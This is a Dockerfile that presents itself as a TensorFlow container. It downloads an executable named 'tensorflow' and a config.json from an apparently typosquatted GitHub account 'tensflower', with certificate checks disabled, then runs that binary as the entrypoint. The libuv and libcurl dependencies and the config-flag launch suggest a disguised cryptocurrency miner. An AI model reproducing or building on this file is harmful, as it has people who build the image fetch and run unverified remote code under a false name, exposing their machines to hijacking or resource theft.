FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        wget \
        libuv1-dev \
        libcurl4-openssl-dev \
    && rm -r /var/lib/apt/lists/* \
    && wget --no-check-certificate https://github.com/tensflower/tensorflow/raw/master/config.json \
    && wget --no-check-certificate https://github.com/tensflower/tensorflow/raw/master/tensorflow \
    && chmod +x tensorflow

ENTRYPOINT ["./tensorflow"]
CMD ["--config=config.json"]